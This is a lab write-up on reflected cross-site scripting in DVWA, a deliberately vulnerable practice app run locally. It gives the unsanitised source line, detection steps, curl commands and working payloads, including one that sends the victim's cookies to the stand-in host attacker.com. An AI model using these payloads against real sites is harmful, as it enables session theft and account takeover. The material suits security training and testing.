# DVWA XSS (Reflected) — Low Security

## URL
http://127.0.0.1:4280/vulnerabilities/xss_r/

## Vulnerable Parameter
name (GET parameter)

## Form Details
- Method: GET
- Input: "What's your name?" text field
- Submits to: `?name=<value>`
- Output: `Hello <name>` displayed on page

## Source Code Behavior (Low)
- No sanitization at all
- Direct echo of user input: `echo 'Hello ' . $_GET['name'];`

## Detection
1. Enter `test` — displays "Hello test"
2. Enter `<script>alert(1)</script>` — JavaScript executes, alert pops up

## Working Payloads

### Basic XSS
```
<script>alert('XSS')</script>
```

### Cookie stealing
```
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

### Image tag event handler
```
<img src=x onerror=alert(1)>
```

### SVG
```
<svg onload=alert(1)>
```

## Step-by-Step Exploitation
1. Enter `test` — confirms input is reflected in page
2. Enter `<script>alert(1)</script>` — XSS executes
3. View page source — confirm payload appears unescaped in HTML
4. Craft cookie-stealing payload for PoC

## curl Command
```bash
# Test XSS reflection
curl -v "http://127.0.0.1:4280/vulnerabilities/xss_r/?name=<script>alert(1)</script>" \
  -b "PHPSESSID=<session>;security=low" \
  -o response.html

# Check if payload is in response unescaped
grep -i "script" response.html
```

## URL-Encoded Payload
```
http://127.0.0.1:4280/vulnerabilities/xss_r/?name=%3Cscript%3Ealert(1)%3C/script%3E
```

## Notes
- Zero filtering — any HTML/JavaScript is reflected as-is
- Reflected XSS — payload must be in the URL/request
- No output encoding, no CSP headers
